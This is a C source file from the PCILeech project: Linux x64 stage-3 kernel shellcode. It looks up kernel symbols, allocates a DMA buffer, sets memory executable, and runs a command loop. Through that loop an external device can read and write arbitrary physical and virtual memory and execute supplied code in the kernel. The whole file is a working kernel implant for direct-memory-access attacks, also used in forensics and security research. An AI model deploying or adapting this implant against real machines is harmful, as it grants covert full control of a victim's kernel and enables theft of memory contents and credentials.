// lx64_stage3_c.c : stage3 main shellcode.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016-2024
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void                    VOID, *PVOID;
typedef int                     BOOL, *PBOOL;
typedef unsigned char           BYTE, *PBYTE;
typedef char                    CHAR, *PCHAR;
typedef unsigned short          WORD, *PWORD;
typedef unsigned long           DWORD, *PDWORD;
typedef unsigned __int64        QWORD, *PQWORD;
typedef void                    *HANDLE;
#define MAX_PATH                260
#define TRUE                    1
#define FALSE                   0

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD LookupFunctions(QWORD qwAddr_KallsymsLookupName, QWORD qwAddr_FNLX);
extern QWORD m_phys_to_virt(QWORD qwAddr_KallsymsLookupName, QWORD pa);
extern QWORD m_page_to_phys(QWORD qwAddr_KallsymsLookupName, QWORD p1);
extern VOID callback_walk_system_ram_range();
extern VOID callback_ismemread_inrange();
extern VOID CacheFlush();

#define LOOKUP_FUNCTION(pk, szFn) (SysVCall(pk->AddrKallsymsLookupName, szFn))

typedef struct _PHYSICAL_MEMORY_RANGE {
    QWORD BaseAddress;
    QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct _TIMEVAL {
    QWORD tv_sec;
    QWORD tv_usec;
} TIMEVAL, *PTIMEVAL;

typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main control program)
    QWORD msleep;
	QWORD alloc_pages_current;
	QWORD set_memory_x;
	QWORD __free_pages;
	QWORD memcpy;
	QWORD schedule;
	QWORD do_gettimeofday;
	QWORD walk_system_ram_range;
	QWORD iounmap;
	QWORD ioremap;
	// optional values below - do not use
	QWORD ktime_get_real_ts64;      // do_gettimeofday alternative if export is missing.
	QWORD _ioremap_nocache;
	QWORD getnstimeofday64;			// do_gettimeofday alternative if export is missing.
	QWORD alloc_pages;
	QWORD set_memory_nx;			// 6.4+ kernels
	QWORD set_memory_rox;			// 6.4+ kernels
	QWORD set_memory_rw;			// 6.4+ kernels
	QWORD _wincall_asm_callback;	// linux ksh-module specific callback address (settable by ksh module). [offset: 0x88 / 0x388]
	QWORD dma_free_attrs;
	QWORD platform_device_alloc;
	QWORD platform_device_add;
	QWORD platform_device_put;
	QWORD dma_alloc_attrs;
	QWORD memset;
	QWORD alloc_pages_noprof;
	QWORD ReservedFutureUse[7];
} FNLX, *PFNLX;

#define KMDDATA_OPERATING_SYSTEM_LINUX          0x02
#define KMDDATA_OPERATING_SYSTEM_MIGRATE        0xffffffff00000000

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNLX fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

// ReservedKMD MAP:
// [0] = task_struct*
// [1] = page* (2-page alloc, if exists)
// [2] = is_migrated (0: no, 1: yes)
// [3] = page* (large buffer, if exists)
// [4] = platform_device* (large buffer, if exists)

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

/*
* Lookup functions in kallsyms_lookup_name.
*/
BOOL LookupFunctionsEx(PKMDDATA pk)
{
    DWORD i;
    PFNLX pfn = &pk->fn;
    LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)pfn);
    if(!pfn->do_gettimeofday) {
        pfn->do_gettimeofday = pfn->ktime_get_real_ts64;
    }
	if(!pfn->do_gettimeofday) {
		pfn->do_gettimeofday = pfn->getnstimeofday64;
	}
    for(i = 0; i < 10; i++) {
        if(!*(((PQWORD)pfn) + i)) {
            return FALSE;
        }
    }
    return TRUE;
}

/*
* Free a struct page* buffer.
*/
VOID FreePageBuffer(PKMDDATA pk, QWORD pg, QWORD order)
{
	QWORD pa, va, cb;
	if(!pg) {
		return;
	}
	pa = m_page_to_phys(pk->AddrKallsymsLookupName, pg);
	if(!pa) {
		return;
	}
	va = m_phys_to_virt(pk->AddrKallsymsLookupName, pa);
	if(!va) {
		return;
	}
	if(pk->fn.memset) {
        cb = (1ULL << order) << 12;
		if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {
			// W^X
			SysVCall(pk->fn.set_memory_nx, va, cb);
		}
		if(pk->fn.set_memory_rw) {
			SysVCall(pk->fn.set_memory_rw, va, cb);
		}
		SysVCall(pk->fn.memset, va, 0, cb);
	}
	SysVCall(pk->fn.__free_pages, pg, order);
}

/*
* Free DMA buffer previously allocated with AllocateDmaLargeBuffer (if exists)
*/
VOID FreeDmaLargeBuffer(PKMDDATA pk)
{
    QWORD p_platdev = pk->ReservedKMD[4];
	pk->ReservedKMD[4] = 0;
	if(pk->fn.dma_free_attrs && p_platdev) {
		SysVCall(pk->fn.dma_free_attrs, p_platdev + 0x10, pk->DMASizeBuffer, pk->DMAAddrVirtual, pk->DMAAddrPhysical, 0);
        if(pk->fn.platform_device_put) {
            SysVCall(pk->fn.platform_device_put, p_platdev);
        }
	}
}

/*
* Tries to allocate 2MB contigious DMA memory.
*/
QWORD AllocateDmaLargeBuffer(PKMDDATA pk)
{
	CHAR device[] = { 'd', 'e', 'v', 0 };
	QWORD p_platdev, p_dev, vaDMA, paDMA;
	if(!pk->fn.platform_device_alloc || !pk->fn.platform_device_add || !pk->fn.dma_alloc_attrs) {
		return 0;
	}
	p_platdev = SysVCall(pk->fn.platform_device_alloc, device, (QWORD)-1);
	if(!p_platdev) {
		return 0;
	}
	//SysVCall(pk->fn.platform_device_add, p_platdev);
	p_dev = p_platdev + 0x10;
	vaDMA = SysVCall(pk->fn.dma_alloc_attrs, p_dev, 0x00200000, &paDMA, (QWORD)0xcc4, 0);
	if(!vaDMA || !paDMA) {
		return 0;
	}
	pk->DMASizeBuffer = 0x00200000;
	pk->DMAAddrPhysical = paDMA;
	pk->DMAAddrVirtual = vaDMA;
	pk->ReservedKMD[4] = p_platdev;
	return 1;
}

/*
* Free DMA buffer previously allocated with AllocateDmaLargeBuffer (if exists)
*/
VOID FreePageLargeBuffer(PKMDDATA pk)
{
    QWORD pg = pk->ReservedKMD[3];
	pk->ReservedKMD[3] = 0;
    if(pg) {
		FreePageBuffer(pk, pg, 9);
	}
}

/*
* Tries to allocate 2MB contigious memory using alloc_pages
*/
QWORD AllocatePageLargeBuffer(PKMDDATA pk)
{
	QWORD pg, pa, va;
	pg = SysVCall(pk->fn.alloc_pages_current, 0xcc4, 9);
	if(!pg) {
		return 0;
	}
	pa = m_page_to_phys(pk->AddrKallsymsLookupName, pg);
	if(!pa) {
		return 0;
	}
    va = m_phys_to_virt(pk->AddrKallsymsLookupName, pa);
	if(!va) {
		return 0;
	}
	pk->DMASizeBuffer = 0x00200000;
	pk->DMAAddrPhysical = pa;
	pk->DMAAddrVirtual = va;
	pk->ReservedKMD[3] = pg;
	return 1;
}

/*
* Free the large buffer irrespective of allocation type.
*/
VOID FreeLargeBuffer(PKMDDATA pk)
{
    FreeDmaLargeBuffer(pk);
    FreePageLargeBuffer(pk);
	pk->DMAAddrPhysical = 0;
	pk->DMAAddrVirtual = 0;
}

/*
* Allocate a large 2MB buffer for DMA operations using either dma_alloc_coherent or alloc_pages.
*/
QWORD AllocateLargeBuffer(PKMDDATA pk)
{
    return AllocateDmaLargeBuffer(pk) || AllocatePageLargeBuffer(pk);
}



// ------------------------------------------------------
// TRY BUFFER MIGRATION FROM INITIAL 'alloc_pages' BUFFER
// TO A NEW 'dma_alloc_coherent' BUFFER.
// ------------------------------------------------------

/*
* Free the original 2-page buffer if execution is migrated.
*/
VOID TryMigrate_FreeOriginalBuffer(PKMDDATA pk)
{
	QWORD fMigrated, pg;
    pg = pk->ReservedKMD[1];
	pk->ReservedKMD[1] = 0;
    fMigrated = pk->ReservedKMD[2];
	if(pg && fMigrated) {
		FreePageBuffer(pk, pg, 1);
	}
    
}

/*
* Try to allocate DMA memory for the migrated main pcileech buffer
* (KMDDATA + stage3 shellcode). A dummy platform device is allocated
* (but not added) for this purpose. Leak the platform device allocation.
*/
QWORD TryMigrate_AllocateMemoryDmaSmall(PKMDDATA pk, QWORD *paDMA)
{
	CHAR device[] = { 'd', 'e', 'v', 0 };
	QWORD p_platdev, p_dev, vaDMA;
	if(!pk->fn.platform_device_alloc || !pk->fn.platform_device_add || !pk->fn.dma_alloc_attrs) {
		return 0;
	}
	p_platdev = SysVCall(pk->fn.platform_device_alloc, device, (QWORD)-1);
	if(!p_platdev) {
		return 0;
	}
	//SysVCall(pk->fn.platform_device_add, p_platdev);
	p_dev = p_platdev + 0x10;
	vaDMA = SysVCall(pk->fn.dma_alloc_attrs, p_dev, 0x2000, paDMA, (QWORD)0xcc4, 0);
	return vaDMA;
}

/*
* Entry point for buffer migration to new more correct dma buffer.
* If migration fail, the shellcode execution will continue in the old buffer.
*/
QWORD stage3_c_TryMigrateEntryPoint(PKMDDATA pk)
{
    QWORD o, vaDMA1 = 0, vaDMA2 = 0, paDMA2 = 0;
	// 1: lookup functions:
	if(!LookupFunctionsEx(pk)) {
		return 0;
	}
    // 2: check if we can set memory rox/rw/nx - we can't migrate due to high risk of a bugcheck.
	if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {

		return 0;
	}
	// 3: allocate new 2-page dma buffer:
    vaDMA2 = TryMigrate_AllocateMemoryDmaSmall(pk, &paDMA2);
    if(!vaDMA2 || !paDMA2) {
		return 0;
    }
    // 4: copy data from old buffer to new buffer:
	vaDMA1 = (QWORD)pk;
    for(o = 0; o < 0x2000; o += 8) {
        *(PQWORD)(vaDMA2 + o) = *(PQWORD)(vaDMA1 + o);
    }
	// 5: set new buffer (+0x1000) as executable:
    if(pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx) {
		// W^X
        SysVCall(pk->fn.set_memory_rox, vaDMA2 + 0x1000, 1);
	} else {
		SysVCall(pk->fn.set_memory_x, vaDMA2 + 0x1000, 1);
	}
	// 6: return to let the shellcode continue migration:
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_MIGRATE | paDMA2;
	pk->MAGIC = 0x0ff11337711333377;
	pk->_status = 0xf0000001;
	pk->_op = KMD_CMD_COMPLETED;
	return (vaDMA2 - vaDMA1);
}



// ------------------------------------------------------
// MAIN EXECUTION LOOP BELOW:
// ------------------------------------------------------

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	BOOL fROX;
	QWORD qwMM, qw;
	TIMEVAL timeLast, timeCurrent;
	// 1: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_LINUX;
	if(!LookupFunctionsEx(pk)) {
		pk->_status = 0xf0000001;
		return;
	}
	fROX = pk->fn.set_memory_rox && pk->fn.set_memory_rw && pk->fn.set_memory_nx;
	// 2: allocate memory
	if(!AllocateLargeBuffer(pk)) {
		pk->_status = 0xf0000002;
		return;
	}
	if(!fROX) {
		SysVCall(pk->fn.set_memory_x, pk->DMAAddrVirtual, pk->DMASizeBuffer / 4096);
	}
	// 3: main dump loop
	SysVCall(pk->fn.do_gettimeofday, &timeLast);
	while(TRUE) {
		pk->_status = 1;
		SysVCall(pk->fn.schedule); // kernel yield - avoid stuck thread
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			SysVCall(pk->fn.do_gettimeofday, &timeCurrent);
			if(timeCurrent.tv_sec > timeLast.tv_sec + 5) {
				SysVCall(pk->fn.msleep, 100); // sleep after 5 seconds
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			FreeLargeBuffer(pk);
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			// mem info is usually called upon initialization,
			// in the case of a buffer migration we piggy-back
			// to clean up the old allocation here.
            if(pk->ReservedKMD[1] && pk->ReservedKMD[2]) {
                TryMigrate_FreeOriginalBuffer(pk);
            }
			if(pk->fn.walk_system_ram_range) {
				pk->_size = 0;
				pk->_result = (0 == SysVCall(pk->fn.walk_system_ram_range, 0, ~0UL, pk, callback_walk_system_ram_range));
			} else {
				pk->_result = FALSE;
			}
			CacheFlush();
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			if(fROX) {
				SysVCall(pk->fn.set_memory_rox, pk->DMAAddrVirtual, 0x80);
			}
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrVirtual)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
			if(fROX) {
				SysVCall(pk->fn.set_memory_nx, pk->DMAAddrVirtual, 0x80);
				SysVCall(pk->fn.set_memory_rw, pk->DMAAddrVirtual, 0x80);
			}
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			// qw :: 0 [all in range], 1 [some in range], 0xffffffff [none in range]
			qw = SysVCall(pk->fn.walk_system_ram_range, pk->_address >> 12, pk->_size >> 12, pk, callback_ismemread_inrange);
			if(qw == 1) {
				pk->_result = FALSE;
			} else {
				qwMM = (qw == 0) ?
					m_phys_to_virt(pk->AddrKallsymsLookupName, pk->_address) :
					SysVCall(pk->fn.ioremap, pk->_address, pk->_size);
				if(qwMM) {
					if(KMD_CMD_READ == pk->_op) { // READ
						SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, qwMM, pk->_size);
					} else { // WRITE
						SysVCall(pk->fn.memcpy, qwMM, pk->DMAAddrVirtual, pk->_size);
					}
					if(qw) {
						SysVCall(pk->fn.iounmap, qwMM);
					}
					pk->_result = TRUE;
				} else {
					pk->_result = FALSE;
				}
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		SysVCall(pk->fn.do_gettimeofday, &timeLast);
	}
}
